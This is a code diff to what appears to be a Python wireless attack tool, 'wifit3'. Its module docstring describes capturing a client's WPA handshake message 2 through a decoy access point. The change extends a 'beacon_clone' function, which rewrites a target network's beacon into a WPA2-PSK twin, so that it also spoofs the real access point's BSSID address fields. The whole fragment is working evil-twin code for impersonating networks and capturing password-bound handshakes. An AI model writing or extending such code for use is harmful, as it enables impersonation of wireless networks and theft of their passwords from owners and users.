@@ -5,6 +5,7 @@ channel; ``auth_resp`` / ``assoc_resp`` / ``eapol_m1`` answer auth/assoc then op
 our ANonce so the client's M2 (its MIC binds the real PSK) is captured.
 """
 import struct
+from typing import Optional
 
 from wifit3.dot11.ie import rates_ie, ext_rates_ie, ds_param_ie, force_psk_akm, GENERIC_RSN_IE
 from wifit3.dot11.eapol import data_header, eapol_key, LLC_SNAP_EAPOL
@@ -59,12 +60,15 @@ def _vht_op_to_20mhz(elem: bytes) -> bytes:
     return elem[:2] + bytes(body)
 
 
-def beacon_clone(real_beacon: bytes, decoy_channel: int) -> bytes:
-    """The target's beacon rewritten to a WPA2-PSK twin."""
+def beacon_clone(real_beacon: bytes, decoy_channel: int, bssid: Optional[bytes] = None) -> bytes:
+    """The target's beacon rewritten to a WPA2-PSK twin. ``bssid`` rewrites Addr2/Addr3."""
     if len(real_beacon) < _BEACON_HEAD:
         raise ValueError(f"beacon too short to rewrite: {len(real_beacon)} bytes")
     head = bytearray(real_beacon[:_BEACON_HEAD])
     head[22:24] = b"\x00\x00"
+    if bssid is not None:
+        head[10:16] = bssid          # Addr2 (SA)
+        head[16:22] = bssid          # Addr3 (BSSID)
     tags = real_beacon[_BEACON_HEAD:]
     kept = bytearray()
     ptr = 0
